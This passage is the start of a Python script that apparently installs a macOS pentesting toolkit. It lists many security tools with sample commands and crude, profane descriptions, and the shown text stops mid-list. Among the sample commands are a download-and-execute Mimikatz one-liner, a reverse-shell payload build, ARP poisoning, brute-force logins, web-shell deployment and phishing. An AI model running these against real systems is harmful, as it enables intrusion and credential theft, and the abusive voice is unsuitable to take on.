#!/usr/bin/env python3

import subprocess
import os
import sys
import time
import webbrowser
from datetime import datetime
import shutil
import html

TOOLS = [
    {"name": "radare2", "install_method": "brew", "function": "Reverse engineerin’ beast, m'kay? Disassembles binaries like a geeky little shit for pentestin’.", "commands": ["r2 <binary>  # Opens file, m'kay", "aaa  # Analyzes all", "pdf @ main  # Disassembles main"], "source": "https://github.com/radareorg/radare2"},
    {"name": "cutter", "install_method": "brew cask", "function": "Radare2 GUI, m'kay? Makes pentestin’ easy for you lazy fucks.", "commands": ["cutter  # Starts GUI, m'kay", "Open binary via interface  # Loads file", "Analyze from GUI  # Runs analysis"], "source": "https://github.com/rizinorg/cutter"},
    {"name": "ghidra", "install_method": "brew cask", "function": "NSA’s reverse tool, m'kay? Tears apart binaries like a nosy bastard for pentestin’.", "commands": ["ghidraRun  # Starts GUI, m'kay", "Import file via GUI  # Loads binary", "Analyze from interface  # Decompiles shit"], "source": "https://github.com/NationalSecurityAgency/ghidra"},
    {"name": "ida-free", "install_method": "brew cask", "function": "Free disassembler, m'kay? Reverse-engineers like a pro little shit for pentestin’.", "commands": ["ida64  # Starts GUI, m'kay", "Load binary via interface  # Opens file", "F5 to decompile  # Shows code"], "source": "https://www.hex-rays.com/products/ida/"},
    {"name": "nmap", "install_method": "brew", "function": "Badass network scanner, m'kay? Maps shit and sniffs ports like a fuckin’ bloodhound for pentestin’.", "commands": ["nmap -sV -Pn <target>  # Sniffs versions, m'kay", "nmap -A -T4 <target>  # Hardcore OS detection", "nmap -p- --open <target>  # All ports, only open"], "source": "https://nmap.org/"},
    {"name": "proxychains", "install_method": "brew", "function": "Proxy router, m'kay? Hides yer traffic like a sneaky little fuck for pentestin’.", "commands": ["proxychains4 nmap <target>  # Proxies command, m'kay", "proxychains4 -q -f config.conf  # Quiet mode", "proxychains4 -h  # Shows help"], "source": "https://github.com/rofl0r/proxychains-ng"},
    {"name": "sqlmap", "install_method": "brew", "function": "Auto-SQL injection tool, m'kay? Rips databases like a little shit for pentestin’.", "commands": ["sqlmap -u 'http://target.com?id=1' --dbs  # Lists DBs, m'kay", "sqlmap -r request.txt --batch  # Uses request", "sqlmap -u <URL> --dump  # Dumps all shit"], "source": "https://github.com/sqlmapproject/sqlmap"},
    {"name": "powershell", "install_method": "brew cask", "function": "Windows scriptin’ tool, m'kay? Runs commands like a geeky bastard for pentestin’.", "commands": ["pwsh  # Starts shell, m'kay", "Get-Process  # Lists processes", "Invoke-WebRequest <url>  # Grabs web shit"], "source": "https://github.com/PowerShell/PowerShell"},
    {"name": "impacket-scripts", "install_method": "git", "git_url": "https://github.com/SecureAuthCorp/impacket.git", "function": "Network protocol toolkit, m'kay? Fucks with SMB and shit for pentestin’.", "commands": ["psexec.py <domain>/<user>:<pass>@<target>  # Runs PSExec, m'kay", "smbclient.py <domain>/<user>:<pass>@<target>  # SMB client", "getTGT.py <domain>/<user>:<pass>  # Grabs Kerberos ticket"], "source": "https://github.com/SecureAuthCorp/impacket"},
    {"name": "powersploit", "install_method": "git", "git_url": "https://github.com/PowerShellMafia/PowerSploit.git", "function": "PowerShell pentest scripts, m'kay? Exploits Windows like a little shit.", "commands": ["IEX (New-Object Net.WebClient).DownloadString('http://<url>/Invoke-Mimikatz.ps1')  # Runs Mimikatz, m'kay", "Invoke-Portscan -Hosts <target>  # Scans ports", "Get-GPPPassword  # Grabs GPP passwords"], "source": "https://github.com/PowerShellMafia/PowerSploit"},
    {"name": "metasploit", "install_method": "script", "script_url": "https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb", "function": "Pentest framework, m'kay? Fucks up everything with payloads.", "commands": ["msfconsole  # Starts console, m'kay", "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> -f exe > payload.exe  # Makes payload", "use exploit/multi/handler  # Sets handler"], "source": "https://github.com/rapid7/metasploit-framework"},
    {"name": "burpsuite", "install_method": "brew", "function": "Web vuln scanner and proxy, m'kay? Snags traffic like a nosy fuck for pentestin’.", "commands": ["burpsuite  # Starts GUI, m'kay", "Set proxy to 127.0.0.1:8080 in browser  # Traps traffic", "Use Repeater to test payloads  # Pokes shit"], "source": "https://portswigger.net/burp"},
    {"name": "john-jumbo", "install_method": "macport", "function": "Jacked-up password cracker, m'kay? Busts hashes like a big bastard for pentestin’.", "commands": ["john <file>  # Cracks hashes, m'kay", "john --wordlist=<list> <file>  # Uses wordlist", "john --show <file>  # Shows cracked shit"], "source": "https://github.com/openwall/john"},
    {"name": "hashcat", "install_method": "brew", "function": "GPU hash-crackin’ monster, m'kay? Smashes passwords like a little shit for pentestin’.", "commands": ["hashcat -m 0 -a 0 <hash> <wordlist>  # MD5 attack, m'kay", "hashcat -m 1000 -a 3 ?d?d?d?d  # NTLM brute", "hashcat --benchmark  # Tests balls"], "source": "https://github.com/hashcat/hashcat"},
    {"name": "hash-id", "install_method": "pip3", "function": "Hash identifier, m'kay? Figures out hash types like a nosy bastard for pentestin’.", "commands": ["hashid <hash>  # Identifies hash, m'kay", "hashid -m <hash>  # Shows hashcat mode", "hashid -j <hash>  # Shows John mode"], "source": "https://github.com/psypanda/hashID"},
    {"name": "wireshark", "install_method": "brew cask", "function": "Packet sniffer, m'kay? Stares at traffic like a creepy fuck for pentestin’.", "commands": ["wireshark &  # Opens GUI, m'kay", "tshark -i <interface> -w capture.pcap  # Captures to file", "wireshark -r capture.pcap -Y 'http.request'  # Filters HTTP"], "source": "https://www.wireshark.org/"},
    {"name": "armitage", "install_method": "brew cask", "function": "Metasploit GUI, m'kay? Makes pentestin’ easy for you lazy shits.", "commands": ["armitage  # Starts GUI, m'kay", "Connect to msfconsole via interface  # Links up", "Launch exploit from GUI  # Fires away"], "source": "http://www.fastandeasyhacking.com/"},
    {"name": "maltego", "install_method": "brew cask", "function": "OSINT graph tool, m'kay? Maps shit like a creepy bastard for pentestin’.", "commands": ["maltego  # Starts GUI, m'kay", "New graph via interface  # Starts mappin’", "Run transform on entity  # Digs deeper"], "source": "https://www.maltego.com/"},
    {"name": "gobuster", "install_method": "brew", "function": "Directory and DNS brute-forcer, m'kay? Finds hidden crap like a nosy fuck for pentestin’.", "commands": ["gobuster dir -u <url> -w <wordlist>  # Directory brute, m'kay", "gobuster dns -d <domain> -w <wordlist>  # DNS brute", "gobuster vhost -u <url> -w <wordlist>  # Vhost scan"], "source": "https://github.com/OJ/gobuster"},
    {"name": "wfuzz", "install_method": "pip3", "function": "Web app fuzzer, m'kay? Smashes parameters like a crazy little shit for pentestin’.", "commands": ["wfuzz -w <wordlist> -u <url>  # Basic fuzz, m'kay", "wfuzz -z range,1-10 -u <url>  # Range fuzz", "wfuzz -w <wordlist> --hc 404 <url>  # Hides 404s"], "source": "https://github.com/xmendez/wfuzz"},
    {"name": "setoolkit", "install_method": "git", "git_url": "https://github.com/trustedsec/social-engineer-toolkit.git", "function": "Social engineerin’ kit, m'kay? Phishes like a sneaky bastard for pentestin’.", "commands": ["setoolkit  # Starts it, m'kay", "1; 2; <target>  # Runs phishin’", "3; 1; <payload>  # Makes payload"], "source": "https://github.com/trustedsec/social-engineer-toolkit"},
    {"name": "exploitdb", "install_method": "brew", "function": "Exploit database, m'kay? Grabs exploit code like a greedy fuck for pentestin’.", "commands": ["searchsploit <term>  # Searches exploits, m'kay", "searchsploit -u  # Updates DB", "searchsploit -p <id>  # Shows path"], "source": "https://github.com/offensive-security/exploitdb"},
    {"name": "evil-winrm", "install_method": "gem", "function": "WinRM shell, m'kay? Connects to Windows like a little shit for pentestin’.", "commands": ["evil-winrm -i <ip> -u <user> -p <pass>  # Connects, m'kay", "evil-winrm -s <scripts>  # Loads scripts", "evil-winrm -e <exe>  # Runs exe"], "source": "https://github.com/Hackplayers/evil-winrm"},
    {"name": "masscan", "install_method": "brew", "function": "Mass IP scanner, m'kay? Scans huge ranges like a speedy bastard for pentestin’.", "commands": ["masscan -p80,443 <range>  # Scans ports, m'kay", "masscan --rate=1000 <range>  # Sets rate", "masscan -oL output.txt <range>  # Lists output"], "source": "https://github.com/robertdavidgraham/masscan"},
    {"name": "nikto", "install_method": "brew", "function": "Web server scanner, m'kay? Finds weak spots like a nosy shit for pentestin’.", "commands": ["nikto -h <target>  # Scans it, m'kay", "nikto -h <target> -Tuning x  # Tweaks scan", "nikto -h <target> -output report.html  # Saves dirt"], "source": "https://github.com/sullo/nikto"},
    {"name": "lynis", "install_method": "brew", "function": "System audit tool, m'kay? Checks security like a paranoid fuck for pentestin’.", "commands": ["lynis audit system  # Full scan, m'kay", "lynis --tests <category>  # Specific tests", "lynis -c -Q  # Quiet check"], "source": "https://github.com/CISOfy/lynis"},
    {"name": "beef-xss", "install_method": "git", "git_url": "https://github.com/beefproject/beef.git", "function": "Browser exploit framework, m'kay? Controls browsers like a little shit for pentestin’.", "commands": ["./beef  # Starts server, m'kay", "Hook browser with <script> tag  # Injects hook", "Use GUI to launch modules  # Exploits shit"], "source": "https://github.com/beefproject/beef"},
    {"name": "binwalk", "install_method": "brew", "function": "Firmware analyzer, m'kay? Extracts shit from binaries like a greedy fuck for pentestin’.", "commands": ["binwalk <firmware.bin>  # Basic scan, m'kay", "binwalk -e <firmware.bin>  # Extracts files", "binwalk -M <firmware.bin>  # Recursive scan"], "source": "https://github.com/ReFirmLabs/binwalk"},
    {"name": "bulk_extractor", "install_method": "brew", "function": "Data carver, m'kay? Pulls shit from files like a nosy bastard for pentestin’.", "commands": ["bulk_extractor -o output <file>  # Basic extract, m'kay", "bulk_extractor -e email <file>  # Grabs emails", "bulk_extractor -R <file>  # Recursive"], "source": "https://github.com/simsong/bulk_extractor"},
    {"name": "w3af", "install_method": "git", "git_url": "https://github.com/andresriancho/w3af.git", "function": "Web app scanner, m'kay? Finds vulns like a little shit for pentestin’.", "commands": ["w3af_console  # Starts console, m'kay", "plugins; audit xss  # Enables XSS audit", "target; set target <url>  # Sets target"], "source": "https://github.com/andresriancho/w3af"},
    {"name": "wpscan", "install_method": "brew", "function": "WordPress vuln scanner, m'kay? Enumerates plugins like a nosy fuck for pentestin’.", "commands": ["wpscan --url <url>  # Basic scan, m'kay", "wpscan --url <url> --enumerate p  # Plugins", "wpscan --url <url> -e u --passwords <wordlist>  # Bruteforces"], "source": "https://github.com/wpscanteam/wpscan"},
    {"name": "ipv6toolkit", "install_method": "brew", "function": "IPv6 pentest tools, m'kay? Scans and fucks with IPv6 like a little bastard.", "commands": ["scan6 -i <interface>  # Scans IPv6, m'kay", "addr6 -i <address>  # Analyzes address", "flow6 -d <target>  # Sends flows"], "source": "https://github.com/fgont/ipv6-toolkit"},
    {"name": "bettercap", "install_method": "brew", "function": "MITM tool, m'kay? Screws with WiFi and shit like a sneaky fuck for pentestin’.", "commands": ["bettercap -iface wlan0  # Starts on interface, m'kay", "bettercap -caplet http-ui  # Fires UI", "bettercap -eval 'wifi.recon on'  # Spies WiFi"], "source": "https://github.com/bettercap/bettercap"},
    {"name": "cewl", "install_method": "git", "git_url": "https://github.com/digininja/CeWL.git", "function": "Wordlist generator, m'kay? Crawls sites like a greedy bastard for pentestin’.", "commands": ["cewl <url>  # Basic wordlist, m'kay", "cewl -d 2 -m 5 <url>  # Depth 2, min 5", "cewl -w output.txt <url>  # Saves to file"], "source": "https://github.com/digininja/CeWL"},
    {"name": "crunch", "install_method": "brew", "function": "Wordlist maker, m'kay? Builds passwords like a little shit for pentestin’.", "commands": ["crunch 6 6  # 6-char list, m'kay", "crunch 4 8 -t @%^-  # Pattern-based", "crunch 5 5 -o list.txt  # Saves to file"], "source": "https://sourceforge.net/projects/crunch-wordlist/"},
    {"name": "hydra", "install_method": "brew", "function": "Password cracker, m'kay? Smashes SSH and shit like a crazy fuck for pentestin’.", "commands": ["hydra -l admin -P <wordlist> ssh://<target>  # Bruteforces SSH, m'kay", "hydra -L users.txt -p pass123 ftp://<target>  # FTP brute", "hydra -t 4 <target> http-post-form  # Limits threads"], "source": "https://github.com/vanhauser-thc/thc-hydra"},
    {"name": "ncrack", "install_method": "brew", "function": "Network cracker, m'kay? Busts logins like a little bastard for pentestin’.", "commands": ["ncrack -p ssh <target>  # Cracks SSH, m'kay", "ncrack -U <users> -P <pass> <target>  # User/pass lists", "ncrack -T 5 <target>  # Timing template"], "source": "https://github.com/nmap/ncrack"},
    {"name": "seclists", "install_method": "git", "git_url": "https://github.com/danielmiessler/SecLists.git", "function": "Wordlist collection, m'kay? Tons of lists for you greedy shits for pentestin’.", "commands": ["ls -l SecLists/  # Lists files, m'kay", "cat SecLists/Passwords/Common-Credentials.txt  # Views common passwords", "Use with other tools  # Feeds bruteforcers"], "source": "https://github.com/danielmiessler/SecLists"},
    {"name": "truecrack", "install_method": "brew", "function": "TrueCrypt cracker, m'kay? Busts encrypted vols like a little shit for pentestin’.", "commands": ["truecrack -t <file> -w <wordlist>  # Cracks with wordlist, m'kay", "truecrack -t <file> -k <keyfile>  # Uses keyfile", "truecrack -v  # Verbose mode"], "source": "https://github.com/lucax88x/TrueCrack"},
    {"name": "webshells", "install_method": "custom", "custom_instructions": "Download from https://github.com/tennc/webshell or similar repo manually, m'kay?", "function": "Web shell collection, m'kay? Backdoors servers like a sneaky fuck for pentestin’.", "commands": ["Upload shell via vuln  # Deploys it, m'kay", "Access via browser  # Controls server", "Customize per shell  # Tweaks as needed"], "source": "https://github.com/tennc/webshell"},
    {"name": "weevely", "install_method": "git", "git_url": "https://github.com/epinna/weevely3.git", "function": "PHP web shell, m'kay? Manages backdoors like a little bastard for pentestin’.", "commands": ["weevely generate <pass> <path>  # Makes shell, m'kay", "weevely <url> <pass>  # Connects", "weevely <url> <pass> shell  # Gets shell"], "source": "https://github.com/epinna/weevely3"},
    {"name": "wordlists", "install_method": "custom", "custom_instructions": "Grab from repos like SecLists or custom sources manually, m'kay?", "function": "Custom wordlist stash, m'kay? Feeds tools for you greedy shits for pentestin’.", "commands": ["ls -l <dir>  # Lists files, m'kay", "cat <list>  # Views list", "Use with bruteforce tools  # Feeds attacks"], "source": "https://github.com/danielmiessler/SecLists"},
    {"name": "dex2jar", "install_method": "brew", "function": "Android DEX converter, m'kay? Turns APKs to JARs like a geeky fuck for pentestin’.", "commands": ["d2j-dex2jar <apk>  # Converts APK, m'kay", "d2j-dex2jar -f <apk>  # Forces overwrite", "d2j-dex2jar -o <output.jar> <apk>  # Custom output"], "source": "https://github.com/pxb1988/dex2jar"},
    {"name": "gdb", "install_method": "brew", "function": "Debugger, m'kay? Steps through code like a nosy little shit for pentestin’.", "commands": ["gdb <binary>  # Starts debug, m'kay", "break main  # Sets breakpoint", "run  # Runs it"], "source": "https://www.gnu.org/software/gdb/"},
    {"name": "jd-gui", "install_method": "brew cask", "function": "Java decompiler, m'kay? Reads JARs like a geeky bastard for pentestin’.", "commands": ["jd-gui  # Starts GUI, m'kay", "Open JAR via interface  # Loads file", "Save source from GUI  # Exports code"], "source": "http://jd.benow.ca/"},
    {"name": "dos2unix", "install_method": "brew", "function": "Line-endin’ converter, m'kay? Fixes files like a little shit for pentestin’.", "commands": ["dos2unix <file>  # Converts file, m'kay", "dos2unix -n <in> <out>  # New file", "dos2unix -v <file>  # Verbose mode"], "source": "https://waterlan.home.xs4all.nl/dos2unix.html"},
    {"name": "exiftool", "install_method": "brew", "function": "Metadata extractor, m'kay? Reads file tags like a nosy fuck for pentestin’.", "commands": ["exiftool <file>  # Shows metadata, m'kay", "exiftool -all= <file>  # Wipes metadata", "exiftool -csv -r <dir>  # Exports CSV"], "source": "https://github.com/exiftool/exiftool"},
    {"name": "steghide", "install_method": "port", "function": "Steganography tool, m'kay? Hides shit in files like a sneaky bastard for pentestin’.", "commands": ["steghide embed -cf <cover> -ef <secret>  # Hides file, m'kay", "steghide extract -sf <file>  # Extracts", "steghide info <file>  # Shows info"], "source": "http://steghide.sourceforge.net/"},
    {"name": "pwntools", "install_method": "brew", "function": "Exploit dev toolkit, m'kay? Helps pwn shit like a geeky fuck for pentestin’.", "commands": ["pwn template <binary>  # Makes script, m'kay", "pwn cyclic 100  # Generates pattern", "pwn disasm <bytes>  # Disassembles"], "source": "https://github.com/Gallopsled/pwntools"},
    {"name": "snort", "install_method": "brew", "function": "IDS/IPS, m'kay? Sniffs and blocks like a paranoid little shit for pentestin’.", "commands": ["snort -c snort.conf  # Runs with config, m'kay", "snort -i eth0 -A console  # Logs to console", "snort -r <pcap>  # Reads pcap"], "source": "https://www.snort.org/"},
    {"name": "volatility", "install_method": "brew", "function": "Memory forensics, m'kay? Digs RAM like a nosy bastard for pentestin’.", "commands": ["vol -f <dump> imageinfo  # Identifies profile, m'kay", "vol -f <dump> --profile=<profile> pslist  # Process list", "vol -f <dump> --profile=<profile> dumpfiles  # Extracts files"], "source": "https://github.com/volatilityfoundation/volatility"},
    {"name": "dnspy", "install_method": "windows", "custom_instructions": "Install via VirtualBox on Windows, m'kay? Get from https://github.com/dnSpy/dnSpy", "function": ".NET debugger, m'kay? Reverses shit like a geeky fuck for pentestin’.", "commands": ["Run dnSpy.exe in VM  # Starts GUI, m'kay", "Open .NET binary via interface  # Loads file", "Debug from GUI  # Steps through"], "source": "https://github.com/dnSpy/dnSpy"},
    {"name": "ilspy", "install_method": "windows", "custom_instructions": "Install via VirtualBox on Windows, m'kay? Get from https://github.com/icsharpcode/ILSpy", "function": ".NET decompiler, m'kay? Reads assemblies like a nosy shit for pentestin’.", "commands": ["Run ILSpy.exe in VM  # Starts GUI, m'kay", "Open assembly via interface  # Loads file", "Export source from GUI  # Saves code"], "source": "https://github.com/icsharpcode/ILSpy"},
    {"name": "immunity", "install_method": "windows", "custom_instructions": "Install via VirtualBox on Windows, m'kay? Get from https://www.immunityinc.com/products/debugger/", "function": "Exploit debugger, m'kay? Debugs shit like a pro bastard for pentestin’.", "commands": ["Run ImmunityDebugger.exe in VM  # Starts GUI, m'kay", "Load binary via interface  # Opens file", "Run debug from GUI  # Steps through"], "source": "https://www.immunityinc.com/products/debugger/"},
    {"name": "virtualbox", "install_method": "brew cask", "function": "VM tool, m'kay? Runs Windows shit like a geeky fuck for pentestin’.", "commands": ["virtualbox  # Starts GUI, m'kay", "VBoxManage createvm --name <name>  # Makes VM", "VBoxManage startvm <name>  # Runs VM"], "source": "https://www.virtualbox.org/"},
    {"name": "virtualbox-extension-pack", "install_method": "brew cask", "function": "VBox extras, m'kay? Adds USB and shit for you lazy bastards for pentestin’.", "commands": ["Installed with brew cask, m'kay", "Check via VirtualBox GUI  # Verifies", "No direct commands  # Auto-applies"], "source": "https://www.virtualbox.org/"},
    {"name": "selenium-server-standalone", "install_method": "brew", "function": "Web automation, m'kay? Drives browsers like a little shit for pentestin’.", "commands": ["java -jar selenium-server-standalone-<version>.jar  # Runs server, m'kay", "Use with script to automate  # Drives browser", "Check logs for status  # Debugs shit"], "source": "https://www.selenium.dev/"},
    {"name": "owasp-zap", "install_method": "brew cask", "function": "Web vuln scanner, m'kay? Finds holes like a nosy fuck for pentestin’.", "commands": ["zap.sh  # Starts GUI, m'kay", "Quick scan via interface  # Runs scan", "Generate report from GUI  # Saves results"], "source": "https://www.zaproxy.org/"},
    {"name": "sslscan", "install_method": "brew", "function": "SSL/TLS scanner, m'kay? Checks ciphers like a paranoid shit for pentestin’.", "commands": ["sslscan <host>  # Basic scan, m'kay", "sslscan --xml=output.xml <host>  # XML output", "sslscan --no-failed <host>  # Shows good ciphers"], "source": "https://github.com/rbsec/sslscan"},
    {"name": "dirb", "install_method": "script", "script_url": "https://sourceforge.net/projects/dirb/files/", "function": "Web directory brute-forcer, m'kay? Finds hidden shit like a nosy bastard for pentestin’.", "commands": ["dirb <url>  # Basic scan, m'kay", "dirb <url> <wordlist> -r  # Recursive brute", "dirb <url> -o output.txt  # Saves loot"], "source": "http://dirb.sourceforge.net/"},
    {"name": "dirbuster", "install_method": "script", "script_url": "https://sourceforge.net/projects/dirbuster/files/", "function": "Web dir brute-forcer, m'kay? Smashes paths like a little shit for pentestin’.", "commands": ["dirbuster  # Starts GUI, m'kay", "Set URL and wordlist via interface  # Configures", "Run scan from GUI  # Bruteforces"], "source": "https://sourceforge.net/projects/dirbuster/"},
    {"name": "osxfuse", "install_method": "brew", "function": "NTFS support for macOS, m'kay? Mounts drives like a geeky fuck for pentestin’.", "commands": ["Install via brew or build from git, m'kay", "Mount NTFS drive via Finder  # Auto-mounts", "Check System Prefs for FUSE  # Verifies"], "source": "https://github.com/osxfuse/osxfuse"},
    {"name": "ettercap", "install_method": "brew", "function": "MITM attack kit, m'kay? Poisons ARP like a sneaky bastard for pentestin’.", "commands": ["ettercap -T -M arp:remote /<target>// /<gateway>//  # ARP poison, m'kay", "ettercap -G  # GUI mode", "ettercap -i eth0 -P dns_spoof  # DNS spoof"], "source": "https://github.com/Ettercap/ettercap"},
    {"name": "gophish", "install_method": "git", "git_url": "https://github.com/gophish/gophish.git", "function": "Phishin’ framework, m'kay? Sends fake emails like a little shit for pentestin’.", "commands": ["gophish  # Starts server, m'kay", "Configure campaign via web UI  # Sets up", "Launch from UI  # Sends phishing"], "source": "https://github.com/gophish/gophish"},
    {"name": "xsser", "install_method": "git", "git_url": "https://github.com/epsylon/xsser.git", "function": "XSS exploiter, m'kay? Finds and fucks with XSS like a nosy bastard for pentestin’.", "commands": ["xsser -u <url>  # Basic scan, m'kay", "xsser -u <url> --auto  # Auto-exploit", "xsser -u <url> -s  # Silent mode"], "source": "https://github.com/epsylon/xsser"},
    {"name": "websploit", "install_method": "git", "git_url": "https://github.com/The404Hacking/websploit.git", "function": "Web pentest toolkit, m'kay? Exploits sites like a little shit.", "commands": ["websploit  # Starts console, m'kay", "use wifi/wifi_jammer  # Jams WiFi", "scan  # Scans target"], "source": "https://github.com/The404Hacking/websploit"},
    {"name": "testssl", "install_method": "brew", "function": "SSL/TLS tester, m'kay? Probes configs like a paranoid fuck for pentestin’.", "commands": ["testssl.sh <host>  # Full scan, m'kay", "testssl.sh --file <file>  # Batch scan", "testssl.sh --heartbleed <host>  # Checks Heartbleed"], "source": "https://github.com/drwetter/testssl.sh"},
    {"name": "smbmap", "install_method": "git", "git_url": "https://github.com/ShawnDEvans/smbmap.git", "function": "SMB enumerator, m'kay? Lists shares like a nosy bastard for pentestin’.", "commands": ["smbmap -H <host>  # Basic enum, m'kay", "smbmap -u <user> -p <pass> -H <host>  # Authenticated", "smbmap -R <host>  # Recursive list"], "source": "https://github.com/ShawnDEvans/smbmap"},
    {"name": "cmsmap", "install_method": "git", "git_url": "https://github.com/Dionach/CMSmap.git", "function": "CMS scanner, m'kay? Hits WordPress and shit like a greedy fuck for pentestin’.", "commands": ["cmsmap.py <url>  # Auto-detects, m'kay", "cmsmap.py -f W <url>  # Forces WordPress", "cmsmap.py -u <user> -p <pass> <url>  # Bruteforces"], "source": "https://github.com/Dionach/CMSmap"},
    {"name": "webscarab", "install_method": "git", "git_url": "https://github.com/OWASP/webscarab.git", "function": "Web proxy, m'kay? Snags traffic like a nosy little shit for pentestin’.", "commands": ["java -jar webscarab.jar  # Starts GUI, m'kay", "Set proxy in browser  # Routes traffic", "Analyze via interface  # Inspects shit"], "source": "https://github.com/OWASP/webscarab"},
    {"name": "theharvester", "install_method": "brew", "function": "OSINT grabber, m'kay? Snags emails like a greedy bastard for pentestin’.", "commands": ["theharvester -d <domain> -b google  # Hits Google, m'kay", "theharvester -d <domain> -l 500 -b all  # Limits 500", "theharvester -d <domain> -f output.html  # Saves HTML"], "source": "https://github.com/laramies/theHarvester"},
    {"name": "subbrute", "install_method": "git", "git_url": "https://github.com/TheRook/subbrute.git", "function": "Subdomain brute-forcer, m'kay? Finds domains like a nosy fuck for pentestin’.", "commands": ["subbrute.py <domain>  # Basic brute, m'kay", "subbrute.py -t <threads> <domain>  # Sets threads", "subbrute.py -r <resolvers> <domain>  # Custom resolvers"], "source": "https://github.com/TheRook/subbrute"},
    {"name": "dnsrecon", "install_method": "git", "git_url": "https://github.com/darkoperator/dnsrecon.git", "function": "DNS enumerator, m'kay? Digs records like a little shit for pentestin’.", "commands": ["dnsrecon -d <domain>  # Basic recon, m'kay", "dnsrecon -t brt -D <wordlist> -d <domain>  # Bruteforces", "dnsrecon -t axfr -d <domain>  # Zone transfer"], "source": "https://github.com/darkoperator/dnsrecon"},
    {"name": "dnsmap", "install_method": "svn", "svn_url": "https://code.google.com/archive/p/dnsmap/source/default/source", "function": "DNS mapper, m'kay? Finds subdomains like a nosy bastard for pentestin’.", "commands": ["dnsmap <domain>  # Basic scan, m'kay", "dnsmap <domain> -w <wordlist>  # Uses wordlist", "dnsmap <domain> -r output.txt  # Saves results"], "source": "https://code.google.com/archive/p/dnsmap/"},
    {"name": "osint-framework", "install_method": "git", "git_url": "https://github.com/lockfale/OSINT-Framework.git", "function": "OSINT toolkit, m'kay? Maps info like a creepy fuck for pentestin’.", "commands": ["Open in browser at https://osintframework.com/  # Web-based, m'kay", "Clone repo and run locally  # Self-hosts", "Use tools via interface  # Runs searches"], "source": "https://github.com/lockfale/OSINT-Framework"},
    {"name": "zenmap", "install_method": "brew cask", "function": "Nmap GUI, m'kay? Scans easy for you lazy shits for pentestin’.", "commands": ["zenmap  # Starts GUI, m'kay", "Set target via interface  # Configures", "Run scan from GUI  # Scans shit"], "source": "https://nmap.org/zenmap/"},
    {"name": "inetutils", "install_method": "brew", "function": "Network utils, m'kay? Pings and traces like a little bastard for pentestin’.", "commands": ["ping <host>  # Pings it, m'kay", "traceroute <host>  # Traces route", "telnet <host> <port>  # Tests port"], "source": "https://www.gnu.org/software/inetutils/"},
    {"name": "arp-scan", "install_method": "brew", "function": "ARP scanner, m'kay? Finds devices like a nosy fuck for pentestin’.", "commands": ["arp-scan -l  # Scans LAN, m'kay", "arp-scan <range>  # Scans range", "arp-scan -I <interface>  # Sets interface"], "source": "https://github.com/royhills/arp-scan"},
    {"name": "macchanger", "install_method": "brew", "formula": "acrogenesis/macchanger/macchanger", "function": "MAC spoofin’ tool, m'kay? Fakes addresses like a sneaky shit for pentestin’.", "commands": ["macchanger -r <interface>  # Random MAC, m'kay", "macchanger -m <mac> <interface>  # Sets MAC", "macchanger -s <interface>  # Shows current"], "source": "https://github.com/acrogenesis/macchanger"},
    {"name": "murus", "install_method": "brew cask", "function": "macOS firewall, m'kay? Blocks shit like a paranoid bastard for pentestin’.", "commands": ["murus  # Starts GUI, m'kay", "Configure rules via interface  # Sets filters", "Enable from GUI  # Activates firewall"], "source": "https://www.murusfirewall.com/"},
    {"name": "angry-ip-scanner", "install_method": "brew cask", "function": "IP scanner, m'kay? Finds hosts like a nosy little shit for pentestin’.", "commands": ["angryipscanner  # Starts GUI, m'kay", "Set range via interface  # Configures", "Scan from GUI  # Runs scan"], "source": "https://github.com/angryip/ipscan"},
    {"name": "sslstrip", "install_method": "git", "git_url": "https://github.com/moxie0/sslstrip.git", "function": "SSL downgrade tool, m'kay? Strips HTTPS like a sneaky fuck for pentestin’.", "commands": ["sslstrip -l 8080  # Listens on port, m'kay", "sslstrip -w output.log  # Logs to file", "sslstrip -k  # Kills sessions"], "source": "https://github.com/moxie0/sslstrip"},
    {"name": "ophcrack", "install_method": "script", "script_url": "https://ophcrack.sourceforge.net/download.php", "function": "Windows password cracker, m'kay? Busts hashes like a little shit for pentestin’.", "commands": ["ophcrack  # Starts GUI, m'kay", "Load hash via interface  # Imports hashes", "Run crack from GUI  # Cracks shit"], "source": "https://ophcrack.sourceforge.net/"},
    {"name": "cyberchef", "install_method": "git", "git_url": "https://github.com/gchq/CyberChef.git", "function": "Data transform tool, m'kay? Decodes shit like a geeky bastard for pentestin’.", "commands": ["Open in browser at http://localhost after cloning  # Web-based, m'kay", "Clone and serve locally  # Self-hosts", "Use recipes via interface  # Transforms data"], "source": "https://github.com/gchq/CyberChef"},
    {"name": "brutespray", "install_method": "git", "git_url": "https://github.com/x90skysn3k/brutespray.git", "function": "Service brute-forcer, m'kay? Hits logins like a crazy fuck for pentestin’.", "commands": ["brutespray.py -f <nmap.xml>  # Uses Nmap output, m'kay", "brutespray.py -f <file> -s ssh  # SSH brute", "brutespray.py -t 10  # 10 threads"], "source": "https://github.com/x90skysn3k/brutespray"},
    {"name": "johnny", "install_method": "script", "script_url": "https://openwall.info/wiki/john/johnny", "function": "John GUI, m'kay? Cracks passwords easy for you lazy shits for pentestin’.", "commands": ["johnny  # Starts GUI, m'kay", "Load hash via interface  # Imports hashes", "Run crack from GUI  # Cracks shit"], "source": "https://openwall.info/wiki/john/johnny"},
    {"name": "rhash", "install_method": "brew", "function": "Hash calculator, m'kay? Checks file hashes like a nosy bastard for pentestin’.", "commands": ["rhash -c <file>  # Checks hash, m'kay", "rhash --md5 <file>  # MD5 hash", "rhash -r <dir>  # Recursive hash"], "source": "http://rhash.sourceforge.net/"},
    {"name": "truecrack", "install_method": "brew", "function": "TrueCrypt cracker, m'kay? Busts encrypted vols like a little shit for pentestin’.", "commands": ["truecrack -t <file> -w <wordlist>  # Cracks with wordlist, m'kay", "truecrack -t <file> -k <keyfile>  # Uses keyfile", "truecrack -v  # Verbose mode"], "source": "https://github.com/lucax88x/TrueCrack"},
    {"name": "pkcrack", "install_method": "brew", "function": "ZIP cracker, m'kay? Busts encrypted ZIPs like a nosy fuck for pentestin’.", "commands": ["pkcrack -c <cipher> -p <plain> -C <zip>  # Cracks ZIP, m'kay", "pkcrack -d <zip>  # Extracts", "pkcrack -v  # Verbose mode"], "source": "https://www.unix-ag.uni-kl.de/~conrad/pkcrack/"},
    {"name": "lcrack", "install_method": "brew", "function": "Password cracker, m'kay? Busts logins like a little shit for pentestin’.", "commands": ["lcrack -m <method> <file>  # Cracks with method, m'kay", "lcrack -w <wordlist> <file>  # Uses wordlist", "lcrack -s  # Shows results"], "source": "https://github.com/clybser/lcrack"},
